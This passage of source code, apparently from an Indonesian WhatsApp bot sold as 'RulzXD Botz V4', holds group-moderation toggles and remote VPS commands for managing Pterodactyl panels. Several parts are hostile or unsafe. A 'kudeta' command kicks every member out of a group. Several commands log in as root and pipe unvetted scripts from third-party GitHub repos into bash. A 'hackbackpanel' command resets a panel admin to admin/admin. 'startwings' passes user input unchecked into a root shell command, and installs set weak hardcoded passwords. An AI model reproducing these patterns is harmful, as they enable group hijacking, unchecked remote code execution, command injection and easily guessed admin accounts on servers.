* Total pengikut : *${res.subscribers + 1}*
`)
}
break

//================================================================================

case "welcome": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].welcome == true) return m.reply(`*Welcome* di grup ini sudah aktif!`)
global.db.groups[m.chat].welcome = true
return m.reply("Berhasil menyalakan *welcome* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].welcome == false) return m.reply(`*Welcome* di grup ini tidak aktif!`)
global.db.groups[m.chat].welcome = false
return m.reply("Berhasil mematikan *welcome* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink == true) return m.reply(`*Antilink* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink2 == true) global.db.groups[m.chat].antilink2 = false
global.db.groups[m.chat].antilink = true
return m.reply("Berhasil menyalakan *antilink* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink == false) return m.reply(`*Antilink* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink = false
return m.reply("Berhasil mematikan *antilink* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "antilink2": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].antilink2 == true) return m.reply(`*Antilink2* di grup ini sudah aktif!`)
if (global.db.groups[m.chat].antilink == true) global.db.groups[m.chat].antilink = false
global.db.groups[m.chat].antilink2 = true
return m.reply("Berhasil menyalakan *antilink2* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].antilink2 == false) return m.reply(`*Antilink2* di grup ini tidak aktif!`)
global.db.groups[m.chat].antilink2 = false
return m.reply("Berhasil mematikan *antilink2* di grup ini")
} else return m.reply(example("on/off"))
}
break

case "antitoxic": case "antibadword": {
  if (!m.isGroup) return m.reply(mess.group)
  if (!m.isAdmin) return m.reply(mess.admin)
  if (!m.isBotAdmin) return m.reply(mess.botAdmin)
  if (!isCreator) return m.reply(mess.owner)
  if (!text) return m.reply(example("on/off"))

  if (args[0].toLowerCase() === "on") {
    if (db.groups[m.chat]?.antitoxic) return m.reply('🚫 Fitur Anti Toxic sudah aktif!')
    db.groups[m.chat].antitoxic = true
    m.reply('✅ Fitur Anti Toxic berhasil diaktifkan.')
  } else if (args[0].toLowerCase() === "off") {
    if (!db.groups[m.chat]?.antitoxic) return m.reply('🚫 Fitur Anti Toxic sudah nonaktif!')
    db.groups[m.chat].antitoxic = false
    m.reply('✅ Fitur Anti Toxic berhasil dimatikan.')

  } else {
    m.reply(`Gunakan format:\n${prefix + command} on/off`)
  }
}
break
  
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mute": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].mute == true) return m.reply(`*Mute* di grup ini sudah aktif!`)
global.db.groups[m.chat].mute = true
return m.reply("Berhasil menyalakan *mute* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].mute == false) return m.reply(`*Mute* di grup ini tidak aktif!`)
global.db.groups[m.chat].mute = false
return m.reply("Berhasil mematikan *mute* di grup ini")
} else return m.reply(example("on/off"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "blacklist": case "blacklistjpm": case "bljpm": {
if (!m.isGroup) return Reply(mess.group)
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("on/off"))
let teks = text.toLowerCase()
if (teks == "on") {
if (global.db.groups[m.chat].blacklistjpm == true) return m.reply(`*Blacklistjpm* di grup ini sudah aktif!`)
global.db.groups[m.chat].blacklistjpm = true
return m.reply("Berhasil menyalakan *blacklistjpm* di grup ini")
} else if (teks == "off") {
if (global.db.groups[m.chat].blacklistjpm == false) return m.reply(`*Blacklistjpm* di grup ini tidak aktif!`)
global.db.groups[m.chat].blacklistjpm = false
return m.reply("Berhasil mematikan *blacklistjpm* di grup ini")
} else return m.reply(example("on/off"))
}
break

//================================================================================

case "close": case "open": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (/open|opengc/.test(command)) {
if (m.metadata.announce == false) return 
await Rulzz.groupSettingUpdate(m.chat, 'not_announcement')
} else if (/closegc|close/.test(command)) {
if (m.metadata.announce == true) return 
await Rulzz.groupSettingUpdate(m.chat, 'announcement')
} else {}
}
break

//================================================================================

case "kudetagc": case "kudeta": {
if (!isCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return m.reply("Grup Ini Sudah Tidak Ada Member!")
await m.reply("Kudeta Grup By *RulzXD* Starting 🔥")
for (let i of memberFilter) {
await Rulzz.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await m.reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break

//================================================================================

case "demote": case "promote": {
if (!m.isGroup) return Reply(mess.group)
if (!m.isBotAdmin) return Reply(mess.botAdmin)
if (!isCreator && !m.isAdmin) return Reply(mess.admin)
if (m.quoted || text) {
var action
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (/demote/.test(command)) action = "Demote"
if (/promote/.test(command)) action = "Promote"
await Rulzz.groupParticipantsUpdate(m.chat, [target], action.toLowerCase()).then(async () => {
await Rulzz.sendMessage(m.chat, {text: `Sukses ${action.toLowerCase()} @${target.split("@")[0]}`, mentions: [target]}, {quoted: m})
})
} else {
return m.reply(example("@tag/6285###"))
}
}
break

//================================================================================

case "uninstalltema": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const ConnSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/RulzzML/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`rulzz\n`) // Key Token : rulzz
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(ConnSettings);
}
break

//================================================================================

case "installdepend": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const ConnSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/RulzzML/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses installdepend pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install Depend Silakan ketik .installnebula ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('11\n');
stream.write('A\n');
stream.write('Y\n');
stream.write('Y\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connectiion Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(ConnSettings);
}
break

//================================================================================

case "installnebula": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const ConnSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/RulzzML/installer-premium/refs/heads/main/zero.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *thema Nebula* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema nebula* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write('2\n');
stream.write('\n');
stream.write('\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(ConnSettings);
}
break

//================================================================================

case "installthemaelyisum": case "installtemaelysium": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const ConnSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/LeXcZxMoDz9/kontol/refs/heads/main/bangke.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema Elysium* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema Elysium* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
 stream.write('1\n');
stream.write('y\n');
stream.write('yes\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(ConnSettings);
}
break

//================================================================================

case "installtemastellar": case "installtemastelar": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isCreator) return Reply(mess.owner)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const ConnSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/RulzzML/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`rulzz\n`) // Key Token : rulzz
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(ConnSettings);
}
break

//================================================================================

case "installtemabilling": case "instaltemabiling": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const ConnSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/RulzzML/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`rulzz\n`) // Key Token : rulzz
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(ConnSettings);
}
break

//================================================================================

case "installtemaenigma": 
case "instaltemaenigma": {
if (!isCreator) return Reply(mess.owner)
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
let vii = text.split("|")
if (vii.length < 2) return m.reply(example("ipvps|pwvps"))
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const ConnSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/RulzzML/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`rulzz\n`); // Key Token : rulzz
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6285133225752\n');
stream.write('https://chat.whatsapp.com/JvZpqqQGmsRCZxn2HgmHE6\n');
stream.write('https://www.rulzzofficial.my.id\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(ConnSettings);
}
break

//================================================================================

case "uninstallpanel": {
if (!isCreator) return m.reply(mess.owner);
if (!text || !text.split("|")) return m.reply(example("ipvps|pwvps"))
var vpsnya = text.split("|")
if (vpsnya.length < 2) return m.reply(example("ipvps|pwvps"))
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const ConnSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
m.reply('Berhasil Uninstall Server Panel ✅');
});
})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Input 0-6`)) {
await stream.write("6\n")
}
if (data.toString().includes(`(y/N)`)) {
await stream.write("y\n")
}
if (data.toString().includes(`* Choose the panel user (to skip don\'t input anything):`)) {
await stream.write("\n")
}
if (data.toString().includes(`* Choose the panel database (to skip don\'t input anything):`)) {
await stream.write("\n")
}
}).stderr.on('data', (data) => {
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
m.reply('Katasandi atau IP tidak valid')
}).connect(ConnSettings);
}
break

//================================================================================

case "installpanel": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let vii = text.split("|")
if (vii.length < 5) return m.reply(example("ipvps|pwvps|panel.com|node.com|ramserver *(contoh 100000)*"))
let sukses = false

const ress = new Client();
const ConnSettings = {
 host: vii[0],
 port: '22',
 username: 'root',
 password: vii[1]
}

const pass = "admin" + getRandom("")
let passwordPanel = pass
const domainpanel = vii[2]
const domainnode = vii[3]
const ramserver = vii[4]
const deletemysql = `\n`
const commandPanel = `bash <(curl -s https://pterodactyl-installer.se)`

async function instalWings() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
ress.exec('bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/createnode.sh)', async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
let teks = `
*📦 Berikut Detail Akun Panel :*

* *Username :* admin
* *Password :* ${passwordPanel}
* *Domain :* ${domainpanel}

*Note :* Silakan Buat Allocation & Ambil Token Wings Di Node Yang Sudah Di Buat Oleh Bot Untuk Menjalankan Wings

*Cara Menjalankan Wings :*
ketik *.startwings* ipvps|pwvps|tokenwings
`
await Rulzz.sendMessage(m.chat, {text: teks}, {quoted: m})
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes("Masukkan nama lokasi: ")) {
stream.write('Pterodactyl\n');
}
if (data.toString().includes("Masukkan deskripsi lokasi: ")) {
stream.write('© Install Panel By Rulzz OfficiaL - 2025\n');
}
if (data.toString().includes("Masukkan domain: ")) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes("Masukkan nama node: ")) {
stream.write('Panel\n');
}
if (data.toString().includes("Masukkan RAM (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan jumlah maksimum disk space (dalam MB): ")) {
stream.write(`${ramserver}\n`);
}
if (data.toString().includes("Masukkan Locid: ")) {
stream.write('1\n');
}
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('1\n');
}
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Enter the panel address (blank for any address)')) {
stream.write(`${domainpanel}\n`);
}
if (data.toString().includes('Database host username (pterodactyluser)')) {
stream.write('admin\n');
}
if (data.toString().includes('Database host password')) {
stream.write(`admin\n`);
}
if (data.toString().includes('Set the FQDN to use for Let\'s Encrypt (node.example.com)')) {
stream.write(`${domainnode}\n`);
}
if (data.toString().includes('Enter email address for Let\'s Encrypt')) {
stream.write('rulzzofficial628@gmail.com\n');
}
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
})
}

async function instalPanel() {
ress.exec(commandPanel, (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalWings()
}).on('data', async (data) => {
if (data.toString().includes('Input 0-6')) {
stream.write('0\n');
} 
if (data.toString().includes('(y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Database name (panel)')) {
stream.write('\n');
}
if (data.toString().includes('Database username (pterodactyl)')) {
stream.write('admin\n');
}
if (data.toString().includes('Password (press enter to use randomly generated password)')) {
stream.write('admin\n');
} 
if (data.toString().includes('Select timezone [Europe/Stockholm]')) {
stream.write('Asia/Jakarta\n');
} 
if (data.toString().includes('Provide the email address that will be used to configure Let\'s Encrypt and Pterodactyl')) {
stream.write('rulzzofficial628@gmail.com\n');
} 
if (data.toString().includes('Email address for the initial admin account')) {
stream.write('admin@gmail.com\n');
} 
if (data.toString().includes('Username for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('First name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Last name for the initial admin account')) {
stream.write('admin\n');
} 
if (data.toString().includes('Password for the initial admin account')) {
stream.write(`${passwordPanel}\n`);
} 
if (data.toString().includes('Set the FQDN of this panel (panel.example.com)')) {
stream.write(`${domainpanel}\n`);
} 
if (data.toString().includes('Do you want to automatically configure UFW (firewall)')) {
stream.write('y\n')
} 
if (data.toString().includes('Do you want to automatically configure HTTPS using Let\'s Encrypt? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Select the appropriate number [1-2] then [enter] (press \'c\' to cancel)')) {
stream.write('1\n');
} 
if (data.toString().includes('I agree that this HTTPS request is performed (y/N)')) {
stream.write('y\n');
}
if (data.toString().includes('Proceed anyways (your install will be broken if you do not know what you are doing)? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('(yes/no)')) {
stream.write('y\n');
} 
if (data.toString().includes('Initial configuration completed. Continue with installation? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Still assume SSL? (y/N)')) {
stream.write('y\n');
} 
if (data.toString().includes('Please read the Terms of Service')) {
stream.write('y\n');
}
if (data.toString().includes('(A)gree/(C)ancel:')) {
stream.write('A\n');
} 
console.log('Logger: ' + data.toString())
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data);
});
});
}

ress.on('ready', async () => {
await m.reply("Memproses *install* server panel \nTunggu 1-10 menit hingga proses selsai")
ress.exec(deletemysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await instalPanel();
}).on('data', async (data) => {
await stream.write('\t')
await stream.write('\n')
await console.log(data.toString())
}).stderr.on('data', async (data) => {
console.log('Stderr : ' + data);
});
});
}).connect(ConnSettings);
}
break  

//================================================================================

case "startwings": case "configurewings": {
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const ConnSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(ConnSettings);
}
break

//================================================================================

case "hbpanel": case "hackbackpanel": {
if (!isCreator) return Reply(mess.owner)
m.reply('Wait bang tunggu beberapa detik....');
let t = text.split('|')
if (t.length < 2) return m.reply(example("ipvps|pwvps"))

let ipvps = t[0]
let passwd = t[1]

const newuser = "admin"
const newpw = "admin"

const ConnSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/RulzzML/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await Rulzz.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("rulzz\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(ConnSettings);
}
break


//================================================================================

case "gantipwvps": {
if (!isCreator) return Reply(mess.owner);
if (!text || !text.split("|"))
return m.reply(example("ipvps|pwvpslama|pwvpsbaru"));
let vii = text.split("|");
if (vii.length < 3)
return m.reply(example("ipvps|pwvpslama|pwvpsbaru"));
   global.ubahpw = {
     vps: vii[0],
     pwvpslama: vii[1],
     pwvpsbaru: vii[2],
    };

   let ipvps = global.ubahpw.vps;
   let passwdlama = global.ubahpw.pwvpslama;
   let pilihan = text;

   const ConnSettings = {
      host: ipvps,
       port: "22",
       username: "root",
       password: passwdlama,
    };

   const command = `bash <(curl https://raw.githubusercontent.com/rulzzml/thema/main/install.sh)`;
   const ress = new Client();

     await m.reply(
            "Memproses Ganti Password VPS\nTunggu 1-2 menit hingga proses selesai"
          );

          ress
            .on("ready", () => {
              ress.exec(command, (err, stream) => {
                let passwdbaru = global.ubahpw.pwvpsbaru;
                if (err) throw err;
                stream
                  .on("close", async (code, signal) => {
                    await m.reply("Berhasil *Ganti Password* VPS");
                    ress.end();
                  })
                  .on("data", async (data) => {
                    console.log(data.toString());
                    stream.write(`rulzz\n`); // Key Token : rulzz
                    stream.write(`8\n`);
                    stream.write(`${passwdbaru}\n`);
                    stream.write(`${passwdbaru}\n`);
                  })
                  .stderr.on("data", (data) => {
                    console.log("STDERR: " + data);
                  });
              });
            })
            .on("error", (err) => {
              console.log("Connection Error: " + err);
              m.reply("Katasandi atau IP tidak valid");
            })
            .connect(ConnSettings);
        }
        break
//================================================================================

case "subdomain": case "subdo": {
if (!isOwner && !isRedo) return m.reply(mess.resellersubdo)
const obj = Object.keys(global.subdomain)
let count = 0
let teks = `
 *#- List all domain server*\n`
for (let i of obj) {
count++
teks += `\n* ${count}. ${i}\n`
}
teks += `\n Contoh : *.domain 2 host|ipvps*\n`
m.reply(teks)

}
break

//================================================================================

//================================================================================

case "addredo": {
if (!isCreator) return Reply(mess.owner)
if (!text && !m.quoted) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 === global.owner || redo.includes(input) || input === botNumber) return m.reply(`Nomor ${input2} sudah menjadi reseller subdomain!`)
redo.push(input)
await fs.writeFileSync("./library/database/redo.json", JSON.stringify(redo, null, 2))
m.reply(`Berhasil menambah reseller ✅`)
}
break

//================================================================================

case "listredo": {
if (redo.length < 1) return m.reply("Tidak ada user reseller subdomain")
let teks = `\n *乂 List all reseller subdomain*\n`
for (let i of redo) {
teks += `\n* ${i.split("@")[0]}
* *Tag :* @${i.split("@")[0]}\n`
}
Rulzz.sendMessage(m.chat, {text: teks, mentions: redo}, {quoted: m})
}
break

//================================================================================

case "delredo": {
if (!isCreator) return Reply(mess.owner)
if (!m.quoted && !text) return m.reply(example("6285###"))
const input = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
const input2 = input.split("@")[0]
if (input2 == global.owner || input == botNumber) return m.reply(`Tidak bisa menghapus owner!`)
if (!redo.includes(input)) return m.reply(`Nomor ${input2} bukan reseller subdomain!`)
let posi = redo.indexOf(input)
await redo.splice(posi, 1)
await fs.writeFileSync("./library/database/redo.json", JSON.stringify(redo, null, 2))
m.reply(`Berhasil menghapus reseller subdomain✅`)
}
break

//================================================================================

case "domain": {
if (!isCreator && !isRedo) return Reply(mess.resellersubdo)
if (!args[0]) return m.reply("Domain tidak ditemukan!")
if (isNaN(args[0])) return m.reply("Domain tidak ditemukan!")
const dom = Object.keys(global.subdomain)
if (Number(args[0]) > dom.length) return m.reply("Domain tidak ditemukan!")
if (!args[1].split("|")) return m.reply("Hostname/IP Tidak ditemukan!")
let tldnya = dom[args[0] - 1]
const [host, ip] = args[1].split("|")
async function subDomain1(host, ip) {
return new Promise((resolve) => {
axios.post(
`https://api.cloudflare.com/client/v4/zones/${global.subdomain[tldnya].zone}/dns_records`,
{ type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tldnya, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
{
headers: {
Authorization: "Bearer " + global.subdomain[tldnya].apitoken,
"Content-Type": "application/json",
},
}).then((e) => {
let res = e.data
if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content })
}).catch((e) => {
let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e
let err1Str = String(err1)
resolve({ success: false, error: err1Str })
})
})}
await subDomain1(host.toLowerCase(), ip).then(async (e) => {
if (e['success']) {
let teks = `
*Berhasil membuat subdomain ✅*\n\n*IP Server :* ${e['ip']}\n*Subdomain :* ${e['name']}
`
await m.reply(teks)
} else return m.reply(`${e['error']}`)
})
}
break

//================================================================================

case "sc": case "script": {
    let teks = `*🚀 RulzXD Botz V4 – Bot WhatsApp Canggih dengan Pembelian Serba Otomatis! 🔥*

🔹 Mau bisnis makin praktis & otomatis? Dengan RulzXD Botz V4, semua transaksi diproses secara otomatis tanpa ribet! Pembelian otomatis, fast response, & fitur canggih lainnya siap membantu bisnismu berkembang!

